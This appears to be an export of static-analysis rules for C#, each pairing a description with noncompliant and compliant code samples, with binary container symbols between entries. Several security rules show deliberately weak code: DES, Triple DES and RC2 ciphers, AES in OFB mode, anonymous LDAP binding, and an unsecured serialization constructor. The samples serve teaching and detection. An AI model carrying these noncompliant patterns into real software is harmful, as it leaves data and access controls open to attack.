<p>While this array conversion can be useful in readonly situations to pass instances of <code>A[]</code> where <code>B[]</code> is expected, it must
be used with care, since assigning an instance of <code>B</code> into an array of <code>A</code> will cause an <code>ArrayTypeMismatchException</code>
to be thrown at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
abstract class Fruit { }
class Apple : Fruit { }
class Orange : Fruit { }

class Program
{
  static void Main(string[] args)
  {
    Fruit[] fruits = new Apple[1]; // Noncompliant - array covariance is used
    FillWithOranges(fruits);
  }

  // Just looking at the code doesn't reveal anything suspicious
  static void FillWithOranges(Fruit[] fruits)
  {
    for (int i = 0; i &lt; fruits.Length; i++)
    {
      fruits[i] = new Orange(); // Will throw an ArrayTypeMismatchException
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
abstract class Fruit { }
class Apple : Fruit { }
class Orange : Fruit { }

class Program
{
  static void Main(string[] args)
  {
    Orange[] fruits = new Orange[1]; // Compliant
    FillWithOranges(fruits);
  }

  static void FillWithOranges(Orange[] fruits)
  {
    for (int i = 0; i &lt; fruits.Length; i++)
    {
      fruits[i] = new Orange();
    }
  }
}
</pre>Z
CODE_SMELL
∞
csharpsquid:S2692ö
csharpsquidS26923"IndexOf" checks should not be for positive numbers"CRITICAL*cs:¥<p>Most checks against an <code>IndexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for values
<code>&gt;0</code> ignore the first element, which is likely a bug. If the intent is merely to check inclusion of a value in a <code>string</code>,
<code>List</code>, or an array, consider using the <code>Contains</code> method instead.</p>
<p>This rule raises an issue when an <code>IndexOf</code> value retrieved from a <code>string</code>, <code>List</code>, or array is tested against
<code>&gt;0</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string color = "blue";
string name = "ishmael";

List&lt;string&gt; strings = new List&lt;string&gt;();
strings.Add(color);
strings.Add(name);
string[] stringArray = strings.ToArray();

if (strings.IndexOf(color) &gt; 0) // Noncompliant
{
  // ...
}
if (name.IndexOf("ish") &gt; 0) // Noncompliant
{
  // ...
}
if (name.IndexOf("ae") &gt; 0) // Noncompliant
{
  // ...
}
if (Array.IndexOf(stringArray, color) &gt; 0) // Noncompliant
{
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
string color = "blue";
string name = "ishmael";

List&lt;string&gt; strings = new List&lt;string&gt; ();
strings.Add(color);
strings.Add(name);
string[] stringArray = strings.ToArray();

if (strings.IndexOf(color) &gt; -1)
{
  // ...
}
if (name.IndexOf("ish") &gt;= 0)
{
  // ...
}
if (name.Contains("ae"))
{
  // ...
}
if (Array.IndexOf(stringArray, color) &gt;= 0)
{
  // ...
}
</pre>Z
CODE_SMELL
ø

csharpsquid:S2339©

csharpsquidS2339*Public constant members should not be used"CRITICAL*cs:Ã	<p>Constant members are copied at compile time to the call sites, instead of being fetched at runtime.</p>
<p>As an example, say you have a library with a constant <code>Version</code> member set to <code>1.0</code>, and a client application linked to it.
This library is then updated and <code>Version</code> is set to <code>2.0</code>. Unfortunately, even after the old DLL is replaced by the new one,
<code>Version</code> will still be <code>1.0</code> for the client application. In order to see <code>2.0</code>, the client application would need to
be rebuilt against the new version of the library.</p>
<p>This means that you should use constants to hold values that by definition will never change, such as <code>Zero</code>. In practice, those cases
are uncommon, and therefore it is generally better to avoid constant members.</p>
<p>This rule only reports issues on public constant fields, which can be reached from outside the defining assembly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
    public const double Version = 1.0;           // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
    public static double Version
    {
      get { return 1.0; }
    }
}
</pre>Z
CODE_SMELL
∑
csharpsquid:S1006°
csharpsquidS10065Method overrides should not change parameter defaults"CRITICAL*cs:π<p>Default arguments are determined by the static type of the object. If a default argument is different for a parameter in an overriding method, the
value used in the call will be different when calls are made via the base or derived object, which may be contrary to developer expectations. </p>
<p>Default parameter values are useless in explicit interface implementations, because the static type of the object will always be the implemented
interface. Thus, specifying default values is useless and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Base
{
  public virtual void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Derived : Base
{
  public override void Write(int i = 5) // Noncompliant
  {
    Console.WriteLine(i);
  }
}

public class Program
{
  public static void Main()
  {
    var derived = new Derived();
    derived.Write(); // writes 5
    Print(derived);  // writes 42; was that expected?
  }
  private void Print(Base item)
  {
    item.Write();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Base
{
  public virtual void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Derived : Base
{
  public override void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Program
{
  public static void Main()
  {
    var derived = new Derived();
    derived.Write(); // writes 42
    Print(derived);  // writes 42
  }
  private void Print(Base item)
  {
    item.Write();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++ 2008, 8-3-1 - Parameters in a overriding virtual function shall either use the same default arguments as the function they override,
  or else shall not specify any default arguments. </li>
</ul>Z
CODE_SMELL
©
csharpsquid:S3353ì
csharpsquidS3353+Unchanged local variables should be "const""CRITICAL*cs:µ<p>Marking a variable that is unchanged after initialization <code>const</code> is an indication to future maintainers that "no this isn't updated,
and it's not supposed to be". <code>const</code> should be used in these situations in the interests of code clarity.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public bool Seek(int[] input)
{
  int target = 32;  // Noncompliant
  foreach (int i in input)
  {
    if (i == target)
    {
      return true;
    }
  }
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public bool Seek(int[] input)
{
  const int target = 32;
  foreach (int i in input)
  {
    if (i == target)
    {
      return true;
    }
  }
  return false;
}
</pre>Z
CODE_SMELL
˛
csharpsquid:S2701Ë
csharpsquidS27017Literal boolean values should not be used in assertions"CRITICAL*cs:˛<p>There's no reason to use literal boolean values in assertions. Doing so is at best confusing for maintainers, and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
bool b = true;
NUnit.Framework.Assert.AreEqual(true, b);
Xunit.Assert.NotSame(true, b);
Microsoft.VisualStudio.TestTools.UnitTesting.Assert.AreEqual(true, b);
System.Diagnostics.Debug.Assert(true);
</pre>Z
CODE_SMELL
”

csharpsquid:S2952Ω

csharpsquidS2952KClasses should "Dispose" of members from the classes' own "Dispose" methods"CRITICAL*cs:∆	<p>It is possible in an <code>IDisposable</code> to call <code>Dispose</code> on class members from any method, but the contract of
<code>Dispose</code> is that it will clean up all unmanaged resources. Move disposing of members to some other method, and you risk resource
leaks.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ResourceHolder : IDisposable
{
  private FileStream fs;
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }
  public void CloseResource()
  {
    this.fs.Close();
  }

  public void CleanUp()
  {
    this.fs.Dispose(); // Noncompliant; Dispose not called in class' Dispose method
  }

  public void Dispose()
  {
    // method added to satisfy demands of interface
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ResourceHolder : IDisposable
{
  private FileStream fs;
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }
  public void CloseResource()
  {
    this.fs.Close();
  }

  public void Dispose()
  {
    this.fs.Dispose();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>ZBUG
Ö
csharpsquid:S5547Ô
csharpsquidS5547"Cipher algorithms should be robust"CRITICAL*cs:ó<p><a href="https://en.wikipedia.org/wiki/Strong_cryptography">Strong cipher algorithms</a> are cryptographic systems resistant to cryptanalysis, they
are not vulnerable to well-known attacks like brute force attacks for example. </p>
<p>It is recommended to use only cipher algorithms intensively tested and promoted by the cryptographic community.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var tripleDES1 = new TripleDESCryptoServiceProvider(); // Noncompliant: Triple DES is vulnerable to meet-in-the-middle attack

var simpleDES = new DESCryptoServiceProvider(); // Noncompliant: DES works with 56-bit keys allow attacks via exhaustive search

var RC2 = new RC2CryptoServiceProvider(); // Noncompliant: RC2 is vulnerable to a related-key attack
</pre>
<h2>Compliant Solution</h2>
<pre>
var AES = new AesCryptoServiceProvider(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>ZVULNERABILITY
∆
csharpsquid:S1067∞
csharpsquidS1067%Expressions should not be too complex"CRITICAL*cs:ÿ<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((MyFirstCondition() || MySecondCondition()) &amp;&amp; MyLastCondition()) { ... }
</pre>Z
CODE_SMELL
¿
csharpsquid:S1186™
csharpsquidS1186Methods should not be empty"CRITICAL*cs:‹<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed. </li>
  <li> It is not yet, or never will be, supported. In this case a <code>NotSupportedException</code> should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public override void DoSomething()
{
}

public override void DoSomethingElse()
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public override void DoSomething()
{
  // Do nothing because of X and Y.
}

public override void DoSomethingElse()
{
  throw new NotSupportedException();
}
</pre>
<h2>Exceptions</h2>
<p>The following methods are ignored:</p>
<ul>
  <li> empty <code>virtual</code> methods, </li>
  <li> empty methods that override an <code>abstract</code> method, </li>
  <li> empty overrides in test assemblies. </li>
</ul>Z
CODE_SMELL
µ
csharpsquid:S4212ü
csharpsquidS4212,Serialization constructors should be secured"CRITICAL*cs:Ω<p>Because serialization constructors allocate and initialize objects, security checks that are present on regular constructors must also be present
on a serialization constructor. Failure to do so would allow callers that could not otherwise create an instance to use the serialization constructor
to do this.</p>
<p>This rule raises an issue when a type implements the <code>System.Runtime.Serialization.ISerializable</code> interface, is not a delegate or
interface, is declared in an assembly that allows partially trusted callers and has a constructor that takes a
<code>System.Runtime.Serialization.SerializationInfo</code> object and a <code>System.Runtime.Serialization.StreamingContext</code> object which is
not secured by a security check, but one or more of the regular constructors in the type is secured.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Permissions;

[assembly: AllowPartiallyTrustedCallersAttribute()]
namespace MyLibrary
{
    [Serializable]
    public class Foo : ISerializable
    {
        private int n;

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]
        public Foo()
        {
           n = -1;
        }

        protected Foo(SerializationInfo info, StreamingContext context) // Noncompliant
        {
           n = (int)info.GetValue("n", typeof(int));
        }

        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
           info.AddValue("n", n);
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Permissions;

[assembly: AllowPartiallyTrustedCallersAttribute()]
namespace MyLibrary
{
    [Serializable]
    public class Foo : ISerializable
    {
        private int n;

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]
        public Foo()
        {
           n = -1;
        }

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]
        protected Foo(SerializationInfo info, StreamingContext context)
        {
           n = (int)info.GetValue("n", typeof(int));
        }

        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
           info.AddValue("n", n);
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li>
</ul>ZVULNERABILITY
Ù	
csharpsquid:S3215ﬁ	
csharpsquidS3215:"interface" instances should not be cast to concrete types"CRITICAL*cs:Ò<p>Needing to cast from an <code>interface</code> to a concrete type indicates that something is wrong with the abstractions in use, likely that
something is missing from the <code>interface</code>. Instead of casting to a discrete type, the missing functionality should be added to the
<code>interface</code>. Otherwise there is a risk of runtime exceptions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface IMyInterface
{
  void DoStuff();
}

public class MyClass1 : IMyInterface
{
  public int Data { get { return new Random().Next(); } }

  public void DoStuff()
  {
    // TODO...
  }
}

public static class DowncastExampleProgram
{
  static void EntryPoint(IMyInterface interfaceRef)
  {
    MyClass1 class1 = (MyClass1)interfaceRef;  // Noncompliant
    int privateData = class1.Data;

    class1 = interfaceRef as MyClass1;  // Noncompliant
    if (class1 != null)
    {
      // ...
    }
  }
}
</pre>
<h2>Exceptions</h2>
<p>Casting to <code>object</code> doesn't raise an issue, because it can never fail.</p>
<pre>
static void EntryPoint(IMyInterface interfaceRef)
{
  var o = (object)interfaceRef;
  ...
}
</pre>Z
CODE_SMELL
í
csharpsquid:S3216¸
csharpsquidS3216&"ConfigureAwait(false)" should be used"CRITICAL*cs:£<p>After an <code>await</code>ed <code>Task</code> has executed, you can continue execution in the original, calling thread or any arbitrary thread.
Unless the rest of the code needs the context from which the <code>Task</code> was spawned, <code>Task.ConfigureAwait(false)</code> should be used to
keep execution in the <code>Task</code> thread to avoid the need for context switching and the possibility of deadlocks.</p>
<p>This rule raises an issue when code in a class library <code>await</code>s a <code>Task</code> and continues execution in the original calling
thread.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var response = await httpClient.GetAsync(url);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var response = await httpClient.GetAsync(url).ConfigureAwait(false);
</pre>Z
CODE_SMELL
™

csharpsquid:S131ï

csharpsquidS131G"switch/Select" statements should contain a "default/Case Else" clauses"CRITICAL*cs:ú	<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken. Even when the <code>switch</code> covers all current values of an <code>enum</code>, a
<code>default</code> case should still be used because there is no guarantee that the <code>enum</code> won't be extended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int foo = 42;
switch (foo) // Noncompliant
{
  case 0:
    Console.WriteLine("foo = 0");
    break;
  case 42:
    Console.WriteLine("foo = 42");
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int foo = 42;
switch (foo) // Compliant
{
  case 0:
    Console.WriteLine("foo = 0");
    break;
  case 42:
    Console.WriteLine("foo = 42");
    break;
  default:
    throw new InvalidOperationException("Unexpected value foo = " + foo);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
ª

csharpsquid:S2365•

csharpsquidS23655Properties should not make collection or array copies"CRITICAL*cs:Ω	<p>Most developers expect property access to be as efficient as field access. However, if a property returns a copy of an array or collection, it will
be much slower than simple field access, contrary to the caller's likely expectations. Therefore, such properties should be refactored into methods so
that callers are not surprised by the unexpectedly poor performance.</p>
<p>This rule detects calls to <code>ToList</code>, <code>ToArray</code> and array <code>Clone</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private List&lt;string&gt; _foo = new List&lt;string&gt; { "a", "b", "c" };
public IEnumerable&lt;string&gt; Foo  // Noncompliant
{
    get
    {
        return _foo.ToList();
    }
}

private string[] _bar = new string[] { "a", "b", "c" };
public IEnumerable&lt;string&gt; Bar // Noncompliant
{
    get
    {
        return (string[])_bar.Clone();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private List&lt;string&gt; _foo = new List&lt;string&gt; { "a", "b", "c" };
private string[] _bar = new string[] { "a", "b", "c" };

public IEnumerable&lt;string&gt; GetFoo()
{
    return _foo.ToList();
}

public IEnumerable&lt;string&gt; GetBar()
{
    return (string[])_bar.Clone();
}
</pre>Z
CODE_SMELL
ø
csharpsquid:S2486©
csharpsquidS2486(Generic exceptions should not be ignored"CRITICAL*cs:À<p>When exceptions occur, it is usually a bad idea to simply ignore them. Instead, it is better to handle them properly, or at least to log them.</p>
<p>This rule only reports on empty catch clauses that catch generic <code>Exception</code>s.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string text = "";
try
{
    text = File.ReadAllText(fileName);
}
catch (Exception exc) // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
string text = "";
try
{
    text = File.ReadAllText(fileName);
}
catch (Exception exc)
{
    logger.Log(exc);
}
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, it is not considered to be empty.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A10-Insufficient_Logging%26Monitoring">OWASP Top 10 2017 Category A10</a> - Insufficient
  Logging &amp; Monitoring </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/391.html">MITRE, CWE-391</a> - Unchecked Error Condition </li>
</ul>ZVULNERABILITY
¶
csharpsquid:S3451ê
csharpsquidS3451K"[DefaultValue]" should not be used when "[DefaultParameterValue]" is meant"CRITICAL*cs:í<p>The use of <code>[DefaultValue]</code> with <code>[Optional]</code> has no more effect than <code>[Optional]</code> alone. That's because
<code>[DefaultValue]</code> doesn't actually do anything; it merely indicates the intent for the value. More than likely, <code>[DefaultValue]</code>
was used in confusion instead of <code>[DefaultParameterValue]</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
    public void DoStuff([Optional][DefaultValue(4)]int i, int j = 5)  // Noncompliant
    {
        Console.WriteLine(i);
    }

    public static void Main()
    {
        new MyClass().DoStuff(); // prints 0
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
{
    public void DoStuff([Optional][DefaultParameterValue(4)]int i, int j = 5)
    {
        Console.WriteLine(i);
    }

    public static void Main()
    {
        new MyClass().DoStuff(); // prints 4
    }
}
</pre>Z
CODE_SMELL
ˇ
csharpsquid:S134Í
csharpsquidS134rControl flow statements "if", "switch", "for", "foreach", "while", "do"  and "try" should not be nested too deeply"CRITICAL*cs:∆<p>Nested <code>if</code>, <code>switch</code>, <code>for</code>, <code>foreach</code>, <code>while</code>, <code>do</code>, and <code>try</code>
statements are key ingredients for making what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
if (condition1) // Compliant - depth = 1
{
  /* ... */
  if (condition2) // Compliant - depth = 2
  {
    /* ... */
    for(int i = 0; i &lt; 10; i++) // Compliant - depth = 3, not exceeding the limit
    {
      /* ... */
      if (condition4) // Noncompliant - depth = 4
      {
        if (condition5) // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
        {
          /* ... */
        }
        return;
      }
    }
  }
}
</pre>Z
CODE_SMELL
∆
csharpsquid:S3217∞
csharpsquidS3217<"Explicit" conversions of "foreach" loops should not be used"CRITICAL*cs:¡<p>The <code>foreach</code> statement was introduced in the C# language prior to generics to make it easier to work with the non-generic collections
available at that time such as <code>ArrayList</code>. The <code>foreach</code> statements allows you to downcast elements of a collection of
<code>Object</code>s to any other type. The problem is that to achieve the cast, the <code>foreach</code> statements silently performs
<code>explicit</code> type conversion, which at runtime can result in an <code>InvalidCastException</code>.</p>
<p>C# code iterating on generic collections or arrays should not rely on <code>foreach</code> statement's silent <code>explicit</code>
conversions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit { }
public class Orange : Fruit { }
public class Apple : Fruit { }

class MyTest
{
  public void Test()
  {
    var fruitBasket = new List&lt;Fruit&gt;();
    fruitBasket.Add(new Orange());
    fruitBasket.Add(new Orange());
    // fruitBasket.Add(new Apple());  // uncommenting this line will make both foreach below throw an InvalidCastException

    foreach (Fruit fruit in fruitBasket)
    {
      var orange = (Orange)fruit; // This "explicit" conversion is hidden within the foreach loop below
      ...
    }

    foreach (Orange orange in fruitBasket) // Noncompliant
    {
      ...
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var fruitBasket = new List&lt;Orange&gt;();
fruitBasket.Add(new Orange());
fruitBasket.Add(new Orange());
// fruitBasket.Add(new Apple());  // uncommenting this line won't compile

foreach (Orange orange in fruitBasket)
{
  ...
}
</pre>
<p>or</p>
<pre>
var fruitBasket = new List&lt;Fruit&gt;();
fruitBasket.Add(new Orange());
fruitBasket.Add(new Orange());
fruitBasket.Add(new Apple());

foreach (Orange orange in fruitBasket.OfType&lt;Orange&gt;())
{
  ...
}
</pre>
<h2>Exceptions</h2>
<p>The rule ignores iterations on collections of <code>object</code>s. This includes legacy code that uses <code>ArrayList</code>. Furthermore, the
rule does not report on cases when user defined conversions are being called. </p>Z
CODE_SMELL
™

csharpsquid:S3218î

csharpsquidS3218JInner class members should not shadow outer class "static" or type members"CRITICAL*cs:ó	<p>It's possible to name the members of an inner class the same as the <code>static</code> members of its enclosing class - possible, but a bad idea.
That's because maintainers may be confused about which members are being used where. Instead the inner class' members should be renamed and all the
references updated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Outer
{
  public static int A;

  public class Inner
  {
    public int A; //Noncompliant
    public int MyProp
    {
      get { return A; }  // Returns inner A. Was that intended?
    }
  }
}
</pre>
<p>After a rename</p>
<pre>
class Outer
{
  public static int A;

  public class Inner
  {
    public int B;
    public int MyProp
    {
      get { return A; }  // Still compiles and runs but functionality has changed
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Outer
{
  public static int A;

  public class Inner
  {
    public int InnerA;
    public int MyProp
    {
      get { return InnerA; }
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/2ADEAw">CERT, DCL51-J.</a> - Do not shadow or obscure identifiers in subscopes </li>
</ul>Z
CODE_SMELL
™

csharpsquid:S927ï

csharpsquidS927Kparameter names should match base declaration and other partial definitions"CRITICAL*cs:ò	<p>The name of a parameter in an externally visible method override does not match the name of the parameter in the base declaration of the method, or
the name of the parameter in the interface declaration of the method or the name of any other <code>partial</code> definition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
partial class Point
{
  partial void MoveVertically(int z);
}

partial class Point
{
  int x = 0;
  int y = 0;
  int z = 0;

  partial void MoveVertically(int y)  // Noncompliant
  {
    this.y = y;
  }
}

interface IFoo
{
  void Bar(int i);
}

class Foo : IFoo
{
  void Bar(int z) // Noncompliant, parameter name should be i
  {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
partial class Point
{
  partial void MoveVertically(int z);
}

partial class Point
{
  int x = 0;
  int y = 0;
  int z = 0;

  partial void MoveVertically(int z)
  {
    this.z = z;
  }
}

interface IFoo
{
  void Bar(int i);
}

class Foo : IFoo
{
  void Bar(int i)
  {
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/cwGTAw">CERT, DCL40-C.</a> - Do not create incompatible declarations of the same
  function or object </li>
</ul>Z
CODE_SMELL
ò
csharpsquid:S2360Ç
csharpsquidS2360&Optional parameters should not be used"CRITICAL*cs:©
<p>The overloading mechanism should be used in place of optional parameters for several reasons:</p>
<ul>
  <li> Optional parameter values are baked into the method call site code, thus, if a default value has been changed, all referencing assemblies need
  to be rebuilt, otherwise the original values will be used. </li>
  <li> The Common Language Specification (CLS) allows compilers to ignore default parameter values, and thus require the caller to explicitly specify
  the values. For example, if you want to consume a method with default argument from another .NET compatible language (for instance C++/CLI), you
  will have to provide all arguments. When using method overloads, you could achieve similar behavior as default arguments. </li>
  <li> Optional parameters prevent muddying the definition of the function contract. Here is a simple example: if there are two optional parameters,
  when one is defined, is the second one still optional or mandatory? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void Notify(string company, string office = "QJZ") // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void Notify(string company)
{
  Notify(company, "QJZ");
}
void Notify(string company, string office)
{
}
</pre>
<h2>Exceptions</h2>
<p>The rule ignores non externally visible methods.</p>Z
CODE_SMELL
é

csharpsquid:S126˘	
csharpsquidS126:"if ... else if" constructs should end with "else" clauses"CRITICAL*cs:ç	<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0)
{
    DoSomething();
}
else if (x == 1)
{
    DoSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0)
{
    DoSomething();
}
else if (x == 1)
{
    DoSomethingElse();
}
else
{
    throw new InvalidOperationException();
}
</pre>
<h2>Exceptions</h2>
<p>None</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
˘
csharpsquid:S4433„
csharpsquidS4433(LDAP connections should be authenticated"CRITICAL*cs:Ö<p>An un-authenticated LDAP connection can lead to transactions without access control. Authentication, and with it, access control, are the last line
of defense against LDAP injections and should not be disabled.</p>
<p>This rule raises an issue when an LDAP connection is created with <code>AuthenticationTypes.Anonymous</code> or
<code>AuthenticationTypes.None</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
DirectoryEntry myDirectoryEntry = new DirectoryEntry(adPath);
myDirectoryEntry.AuthenticationType = AuthenticationTypes.None; // Noncompliant

DirectoryEntry myDirectoryEntry = new DirectoryEntry(adPath, "u", "p", AuthenticationTypes.None); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
DirectoryEntry myDirectoryEntry = new DirectoryEntry(myADSPath); // Compliant; default DirectoryEntry.AuthenticationType property value is "Secure" since .NET Framework 2.0

DirectoryEntry myDirectoryEntry = new DirectoryEntry(myADSPath, "u", "p", AuthenticationTypes.Secure);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/521.html">CWE-521</a> - Weak Password Requirements </li>
  <li> <a href="https://docs.oracle.com/javase/tutorial/jndi/ldap/authentication.html">Modes of Authenticating to LDAP</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#LDAP_ANONYMOUS">LDAP_ANONYMOUS</a> </li>
</ul>ZVULNERABILITY
‰
csharpsquid:S1163Œ
csharpsquidS11631Exceptions should not be thrown in finally blocks"CRITICAL*cs:Í<p>Throwing an exception from within a finally block will mask any exception which was previously thrown in the <code>try</code> or <code>catch</code>
block, and the masked's exception message and stack trace will be lost.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try
{
  /* some work which end up throwing an exception */
  throw new ArgumentException();
}
finally
{
  /* clean up */
  throw new InvalidOperationException();       // Noncompliant; will mask the ArgumentException
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try
{
  /* some work which end up throwing an exception */
  throw new ArgumentException();
}
finally
{
  /* clean up */                       // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/soUbAQ">CERT, ERR05-J.</a> - Do not let checked exceptions escape from a finally block
  </li>
</ul>Z
CODE_SMELL
›
csharpsquid:S4432«
csharpsquidS44329AES encryption algorithm should be used with secured mode"CRITICAL*cs:ÿ<p>Encryption algorithms can be used with various modes. Some combinations are not secured:</p>
<ul>
  <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it does
  not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in cryptographic
  protocols at all. </li>
  <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. CBC + PKCS#7 can be used if combined with
  an authenticity check (HMAC-SHA256 for example) on the cipher text. </li>
</ul>
<p>In both cases, Galois/Counter Mode (GCM) with no padding should be preferred. As the .NET framework doesn't provide this natively, the use of a
certified third party lib is recommended. </p>
<p>This rule raises an issue when any of the following CipherMode is detected: ECB, CBC, OFB, CFB, CTS.</p>
<h2>Noncompliant Code Example</h2>
<pre>
AesManaged aes = new AesManaged
{
  KeySize = 128,
  BlockSize = 128,
  Mode = CipherMode.OFB, // Noncompliant
  Padding = PaddingMode.PKCS7
};
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
